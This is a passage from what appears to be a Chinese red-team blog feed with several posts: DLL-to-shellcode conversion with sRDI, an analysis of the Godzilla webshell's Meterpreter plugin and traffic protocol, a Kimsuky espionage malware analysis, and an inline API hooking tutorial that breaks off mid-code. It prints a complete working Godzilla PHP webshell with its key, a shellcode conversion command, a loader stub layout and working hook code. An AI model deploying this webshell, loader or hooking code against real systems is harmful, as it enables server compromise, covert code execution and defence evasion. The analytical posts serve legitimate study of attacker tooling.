    <link href="http://422926799.github.io/posts/8f26af05.html"/>
    <id>http://422926799.github.io/posts/8f26af05.html</id>
    <published>2021-09-09T09:18:53.000Z</published>
    <updated>2021-09-09T09:41:31.391Z</updated>
    
    <content type="html"><![CDATA[<p>昨天重新看到了dll转shellcode的文章想分析一下原理，所以<br>有了这篇文章。</p><h2 id="实现DLL加载两个方法"><a href="#实现DLL加载两个方法" class="headerlink" title="实现DLL加载两个方法"></a>实现DLL加载两个方法</h2><p>1.从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL<br>2.实现一段LoadPE的shellcode，DLL跟在后面</p><h2 id="DLL加载原理"><a href="#DLL加载原理" class="headerlink" title="DLL加载原理"></a>DLL加载原理</h2><blockquote><p>启动一个可执行模块的时候,操作系统的加载程序会先为进程创建虚拟地址空间,接着把可执行模块映射到进程的地址空间中.之后加载程序会检查可执行模块的导入段, 试图对所需的DLL进行定位并将它们映射到进程的地址空间中. 由于导入段只包含DLL的名称,不包含DLL的路径,因此加载程序必须在用户的磁盘上搜索DLL. 下面是加载程序的搜索顺序: (1) 包含可执行文件的目录; (2) Windows的系统目录; GetSystemDirctory (3) 16位的系统目录, 即Windows/System (4) Windows目录 GetWindowsDirectory (5) 进程的当前目录; (6) PATH 环境变量中所列出的目录;</p></blockquote><h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><p><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a></p><pre><code class="powershell">import-module \.ConvertTo-Shellcode.ps1$c=ConvertTo-Shellcode .\test.dll$d=$c |%{write-output ([system.string]::format(&#39;{0:X2}&#39;,$_))}$d -join &quot;&quot; | Out-File shellcode.txt</code></pre><p>得到shellcode.txt py转换一下直接执行shellcode或者把得到的十六进制用010editor十六进制写入到某文件嵌套到资源里读取执行<br><img src="https://z3.ax1x.com/2021/09/09/hL2CM4.png" alt=""></p><p>shellcode执行测试<br><img src="https://z3.ax1x.com/2021/09/09/hL28ot.png" alt=""></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>它的原理是在不改变MZ标志的情况下把整个dll文件修补成可被当作shellcode加载的格式，具体的操作为在dll内导出自加载函数(ReflectiveLoader)然后讲MZ头起始字节修改成执行ReflectiveLoader函数的硬编码</p><p>WBG的描述:</p><blockquote><p>其实所谓的修补反射dll其实就是修改dll头部让其变成汇编指令去调用ReflectiveLoader函数然后ReflectiveLoader函数会经过一系列处理最后会调用DllMain。这时这个dll就像shellcode一样可以直接执行，其实我们所做的就是解析dll找到ReflectiveLoader函数并将其地址硬编码写到Dll头部然后call</p></blockquote><p>自己实现具体过程：</p><ol><li>定位DLL文件在内存中的基址</li><li>获取所需的系统API</li><li>分配一片用来装载DLL的空间</li><li>复制PE文件头和各个节</li><li>处理DLL的引入表</li><li>对DLL进行重定位</li><li>调用DLL入口点</li></ol><p>目前网上的版本有两种：</p><pre><code>* 带解压缩的版本：先把dll压缩然后在构造一段解压数据的C编译后提取ASM，然后将DLL拼接到后面 -&gt;看雪那个就是这样* 不带压缩版本：直接修补，去掉MZ头</code></pre><p>两个版本的都看了分析一下<br>带压缩版本的：利用RtlGetCompressionWorkSpaceSize和RtlCompressBuffer实现数据压缩，然后修补DLL<br><img src="https://z3.ax1x.com/2021/09/09/hLRQpT.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRbEn.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLRvgU.png" alt=""></p><p>WBG版本的修补:</p><pre><code>* 从DIRECTORY_ENTRY_EXPORT寻找ReflectiveLoader函数，修补之后利用该函数加载DLL</code></pre><p><img src="https://z3.ax1x.com/2021/09/09/hLW3PP.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWtKg.png" alt=""></p><p>ConvertTo-Shellcode.py分析<br>-&gt;读取DLL数据，传入ConvertToShellcode() -&gt; 中间调用了一个HashFunctionName函数计算arguments.function_name<br><img src="https://z3.ax1x.com/2021/09/09/hLW05q.png" alt=""></p><p>HashFunction函数<br><img src="https://z3.ax1x.com/2021/09/09/hLWfaR.png" alt=""><br>（计算函数hash）<br><img src="https://z3.ax1x.com/2021/09/09/hLWIG6.png" alt=""></p><p>ConvertToShellcode函数<br>-&gt;判断DLL是否为64位<br>-&gt;根据对应的位数取LoadPE的shellcode<br>-&gt;bootstrap拼接对应的指令<br>-&gt;bootstrap + rdiShellcode + dllBytes + userData<br><img src="https://z3.ax1x.com/2021/09/09/hLWbse.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWXdA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLWzJP.png" alt=""></p><p>大概如下：</p><pre><code>call &lt;xxx&gt;pop eaxpush ebpmov ebp,espmov edx,eaxadd eax,&lt;DLL偏移量&gt;add edx,&lt;DLL偏移量&gt;+&lt;DLL大小&gt;push &lt;flags&gt;push 0push edxpush &lt;functionHash&gt;push eaxcall &lt;DLL&gt;add esp,0x14leaveret.............&lt;LOADPE_ShellCode&gt;.............&lt;DLLBytest&gt;</code></pre><p>指定dll生成bin，丢golink生成exe<br><img src="https://z3.ax1x.com/2021/09/09/hLfKQU.png" alt=""></p><p>入口点：<br><img src="https://z3.ax1x.com/2021/09/09/hLfYJx.png" alt=""></p><p>dword_401C04是DLL bytes<br><img src="https://z3.ax1x.com/2021/09/09/hLfaQO.png" alt=""></p><p>-&gt;从PEB里寻找ntdll.dll的LdrLoadDLL函数<br>-&gt;从PEB里寻找ntdll.dll的LdrGetProcAddress函数<br>-&gt;利用LdrLoadDLL加载Kernel32.dll<br>    -&gt;加载VirtuaLLoc函数<br>    -&gt;加载VirtualProtect函数<br>    -&gt;加载FlushInstructionCache函数<br>    -&gt;加载GetNativeSysteminfo函数<br>    -&gt;加载Sleep函数<br>    -&gt;加载RtlAddFunctionTable函数<br>    -&gt;加载LoadlibraryA函数<br>-&gt;判断对应的DLL函数是否加载成功<br>-&gt;DLL各个区段赋值变量<br>-&gt;调用GetNativeSystemInfo函数<br>-&gt;Virtualloc修改内存可读可写<br>-&gt;复制PE文件头和各个节<br>-&gt;处理DLL的引入表<br>-&gt;对DLL进行重定位<br>-&gt;调用FlushInstructionCache刷新内存<br>-&gt;加载DLLMain函数<br><img src="https://z3.ax1x.com/2021/09/09/hLfrTA.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf6Yt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf2Sf.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLf4mQ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfITs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/09/hLfHf0.png" alt=""></p><p>最后的启动顺序<br>（图片来源WBG）<br><img src="https://z3.ax1x.com/2021/09/09/hLfLlT.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接：<br><a href="https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/" target="_blank" rel="noopener">https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-shellcode-dll-injection</a><br><a href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation</a><br><a href="https://www.cnblogs.com/h2zZhou/p/7721797.html" target="_blank" rel="noopener">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p><p>现成工具:<br><a href="https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1" target="_blank" rel="noopener">https://github.com/monoxgas/sRDI/blob/7889036a75e3aca65a2c01ee8f5549ed779a4c1f/PowerShell/ConvertTo-Shellcode.ps1</a><br><a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a> - 划重点</p><p>WBG的项目:<br><a href="https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py" target="_blank" rel="noopener">https://github.com/WBGlIl/ReflectiveDLL_Patch/blob/master/ReflectiveDLL_Patch.py</a><br><a href="https://github.com/WBGlIl/go-ReflectiveDLL" target="_blank" rel="noopener">https://github.com/WBGlIl/go-ReflectiveDLL</a></p><p>看雪的项目:<a href="https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode" target="_blank" rel="noopener">https://github.com/killeven/DllToShellCode/tree/master/DllToShellCode</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天重新看到了dll转shellcode的文章想分析一下原理，所以&lt;br&gt;有了这篇文章。&lt;/p&gt;
&lt;h2 id=&quot;实现DLL加载两个方法&quot;&gt;&lt;a href=&quot;#实现DLL加载两个方法&quot; class=&quot;headerlink&quot; title=&quot;实现DLL加载两个方法&quot;&gt;&lt;/a&gt;实</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>哥斯拉实现meterpreter分析</title>
    <link href="http://422926799.github.io/posts/19caa6fb.html"/>
    <id>http://422926799.github.io/posts/19caa6fb.html</id>
    <published>2021-09-03T19:08:51.000Z</published>
    <updated>2021-09-03T19:15:22.777Z</updated>
    
    <content type="html"><![CDATA[<p>哥斯拉version:1.0<br>Cryption:PHP_XOR_BASE64<br>这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class</p><pre><code>* 先获取对于payload类型，然后从对应payload目录下读取反弹meterpreter的payload文件 （对应路径：plugins/&lt;scriptname&gt;/assets）* 调用对应payload里的include函数* include函数调用evalFunc，发送POST请求调用大马里的includeCode函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccpa8.png" alt=""></p><p>调用对应payload里的include函数<br><img src="https://z3.ax1x.com/2021/09/04/hcc9IS.png" alt=""></p><p>通过get函数获取到$parameter数组里对应的binCode和codeName的value，最后写在session里（将反弹meterprter的payload拼接写到存大马的session文件里）<br><img src="https://z3.ax1x.com/2021/09/04/hccPPg.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hcckxs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hccEMn.png" alt=""></p><p>抓包如下<br><img src="https://z3.ax1x.com/2021/09/04/hccVrq.png" alt=""></p><p>之后点击Go Button后触发GoButtonClick事件</p><pre><code>* 发送POST请求调用大马里对应的run函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccZq0.png" alt=""></p><p>Run函数</p><pre><code>* 获取传送过来的数据做好好下步划分的准备* 判断是否要进行bypass_open_basedir* 调用evalFunc函数执行反弹meterprter的code</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccmZV.png" alt=""></p><p>就是<code>eval($_SESSION[&quot;Meterpreter&quot;])</code><br><img src="https://z3.ax1x.com/2021/09/04/hccuIU.png" alt=""></p><p>抓包如下<br>第二个PHPSESSIONID对应<code>$_SESSION[&quot;meterpter&quot;]</code><br><img src="https://z3.ax1x.com/2021/09/04/hccMiF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/04/hccQG4.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;哥斯拉version:1.0&lt;br&gt;Cryption:PHP_XOR_BASE64&lt;br&gt;这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 先获取对于payload类型，然后从</summary>
      
    
    
    
    
    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
    
  </entry>
  
  <entry>
    <title>哥斯拉整体过程刨析</title>
    <link href="http://422926799.github.io/posts/befc239e.html"/>
    <id>http://422926799.github.io/posts/befc239e.html</id>
    <published>2021-09-03T13:27:25.000Z</published>
    <updated>2021-09-03T19:05:54.125Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文主要是分析哥斯拉流量协议实现的过程&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;版本:v1.0&lt;br&gt;有效荷载:Phpdynxxxxx&lt;br&gt;加密器:php_xor_</summary>
      
    
    
    
    
    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
    
  </entry>
  
  <entry>
    <title>Kimsuky 间谍活动分析</title>
    <link href="http://422926799.github.io/posts/5c51f955.html"/>
    <id>http://422926799.github.io/posts/5c51f955.html</id>
    <published>2021-08-26T17:25:04.000Z</published>
    <updated>2021-08-26T17:39:05.501Z</updated>
    
    <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;事件背景:韩国外交部文件及其通讯的诱饵&lt;br&gt;样本地址：&lt;a href=&quot;https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>Inline Hook研究</title>
    <link href="http://422926799.github.io/posts/3d0703bd.html"/>
    <id>http://422926799.github.io/posts/3d0703bd.html</id>
    <published>2021-08-18T17:31:25.000Z</published>
    <updated>2021-08-18T17:44:49.732Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>Hoo kMessageBox测试<br>x86思路如下:</p><pre><code>1.调用 GetModuleHandle 来获取到模块的基址(user32.dll)2.调用 GetProcAddress 获取到MessageBoxA弹窗的基址3.调用 VirtualProtect 来修改MsgBox前5个字节内存属性4.计算 Dest - MsgBox - 5 重定位跳转地址，并Jmp跳转5.计算 Dest + Offset + 5 = MsgBox +5 跳转回来</code></pre><p>疑问：为什么是5个字节？，jmp指令的机器码刚好5字节 </p><pre><code>E9 87 FE FF FF</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/5fa3973bebe61edb.png" alt=""></p><p>而在调用MessageBoxA API之前的保存栈堆新开堆栈时刚好够5字节（机器码共5个字节，<strong>这种情况适用于大部分API但并非全部API都适用</strong>）</p><pre><code>8B FF mov edi,pdi55 push ebp //新栈顶8B EC mov ebp,esp //保留堆栈Hook后这些指令就变成了一条jmp指令</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/e50facfac63f4c54.png" alt=""></p><p>最终在OD类似如下<br><img src="https://i.bmp.ovh/imgs/2021/08/639e3b28efd2c5ea.png" alt=""></p><p>x86内嵌asm hook实现如下：</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (WINAPI        *MessageBox_type) (               __in_opt HWND hWnd,               __in_opt LPCSTR lpText,               __in_opt LPCSTR lpCaption,               __in UINT uType);MessageBox_type RealMessageBox = MessageBoxA;//我们自己的MessageBox，每调用MessageBox都要跳到myMessageBox来处理_declspec(naked)  void WINAPImyMessageBox(        __in_opt HWND hWnd,        __in_opt LPCSTR lpText,        __in_opt LPCSTR lpCaption,        __in UINT uType){        __asm        {               PUSH ebp               mov ebp, esp               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               push esi        }        //下面打印MessageBox参数        printf(&quot;hwnd:%8X lpText:%s lpCaption:%s,uType:%8X&quot;, hWnd, lpText, lpCaption,  uType);        __asm        {               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               pop esi               mov ebx, RealMessageBox               add ebx, 5 //地址恢复避免重复hook               jmp ebx        }}#pragma pack(1)typedef struct _JMPCODE{        BYTE jmp;        DWORD addr;}JMPCODE, *PJMPCODE;VOID HookMessageBoxA(){        JMPCODE jcode;        jcode.jmp = 0xe9;//jmp        jcode.addr = (DWORD)myMessageBox - (DWORD)RealMessageBox - 5; //自己的函数地址-MessageBox基址-jmp指令大小        RealMessageBox = MessageBoxA;        ::WriteProcessMemory(GetCurrentProcess(), MessageBoxA, &amp;jcode, sizeof(JMPCODE),  NULL);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookMessageBoxA();  //hook操作               MessageBoxA(NULL, &quot;HOOK&quot;, &quot;HOOKKKKKK&quot;, MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3500eae2f47e893c.png" alt=""></p><p>x64如下<br>1.备份原来的指令<br>2.8个0x90替换为要跳转的函数地址<br>3.自己的函数中要执行的内容<br>4.恢复原来的指令</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[12] = { 0x00 };BYTE HookCode[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF,   0xE0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 12); // 拷贝原始机器码指令到oldcode               *(PINT64)(HookCode + 2) = (UINT64)lpFunction; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>结果如下：<br><img src="https://i.bmp.ovh/imgs/2021/08/751af19c5be90b0c.png" alt=""></p><p>HookCode刨析：<br><img src="https://i.bmp.ovh/imgs/2021/08/b44d6d77e50cacb0.png" alt=""></p><p>x86话的HookCode为E9 00 00 00 00 （另外个执行例子）还需要减去5字节的便宜地址<br><img src="https://i.bmp.ovh/imgs/2021/08/0a49ec7f3aec9db7.png" alt=""></p><p>x86非内嵌asm，x86要将自己函数处理的地址-被Hook函数+5得出的偏移地址 (至于为什么我也不知道，原文写的不清不楚)</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[5] = { 0x00 };BYTE HookCode[5] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        DWORD dfset = 0;        dfset = (DWORD)lpFunction - ((DWORD)FuncAddress + 5); //偏移地址计算        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 5); // 拷贝原始机器码指令到oldcode               *(PINT32)(HookCode + 1) = (UINT32)dfset; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR 